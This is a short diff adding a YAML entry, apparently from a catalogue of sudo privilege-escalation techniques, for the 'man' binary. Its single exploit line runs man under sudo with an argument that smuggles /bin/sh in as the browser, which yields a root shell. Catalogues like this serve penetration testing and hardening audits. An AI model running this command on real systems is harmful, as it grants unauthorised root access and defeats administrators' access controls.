@@ -1,0 +1,4 @@
+name: man
+binary_path: /usr/bin/man
+exploit_cmds:
+- 'sudo /usr/bin/man ''-H/bin/sh #'' /usr/bin/man'
